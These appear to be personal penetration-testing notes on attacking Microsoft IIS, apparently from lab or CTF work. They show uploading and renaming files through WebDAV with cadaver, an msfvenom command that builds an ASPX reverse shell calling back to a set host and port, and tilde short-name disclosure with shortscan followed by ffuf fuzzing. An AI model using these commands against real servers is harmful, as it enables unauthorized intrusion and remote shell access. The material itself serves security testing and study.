# IIS

If HTTP methods such as PUT and MOVE are allowed, we can use cadaver to upload a file and rename it

{% code overflow="wrap" %}
```bash
cadaver $HOSTNAME
put $FILE
move $FILE
# We can use more HTTP methods but these are important for exploiting.

msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.0 LPORT=80 -f aspx -o reverse.aspx
```
{% endcode %}

&#x20;[https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/iis-internet-information-services.html?highlight=iis#iis---internet-information-services](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/iis-internet-information-services.html?highlight=iis#iis---internet-information-services)

[https://github.com/reewardius/iis-pentest](https://github.com/reewardius/iis-pentest)

## Uploading web.config

[https://soroush.me/blog/2014/07/upload-a-web-config-file-for-fun-profit/](https://soroush.me/blog/2014/07/upload-a-web-config-file-for-fun-profit/)

## Microsoft IIS tilde character “\~” – Short File/Folder Name Disclosure

[https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/iis-internet-information-services.html?highlight=iis#microsoft-iis-tilde-character--vulnerabilityfeature--short-filefolder-name-disclosure](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/iis-internet-information-services.html?highlight=iis#microsoft-iis-tilde-character--vulnerabilityfeature--short-filefolder-name-disclosure)

Best tool -> [https://github.com/bitquark/shortscan\\](https://github.com/bitquark/shortscan/)

{% code overflow="wrap" fullWidth="true" %}
```bash
#Running the tool, I can find a part of the filepath:
└─$ shortscan http://10.13.38.11/dev/304c0c90fbc6520610abbf378e2339d1/db
...
Vulnerable: Yes!
════════════════════════════════════════════════════════════════════════════════
POO_CO~1.TXT         POO_CO?.TXT?
════════════════════════════════════════════════════════════════════════════════


poo_coXXX.txt

# The second word after the underscore can be fuzzed (we could even narrow the search by grepping only coXXX words):


└─$ ffuf -c -r -u http://10.13.38.11/dev/304c0c90fbc6520610abbf378e2339d1/db/poo_FUZZ -w /usr/share/custom-wordlists/Fuzzing/directory-list-lowercase-2.3-medium.txt -e .txt -t 200 -mc all
```
{% endcode %}
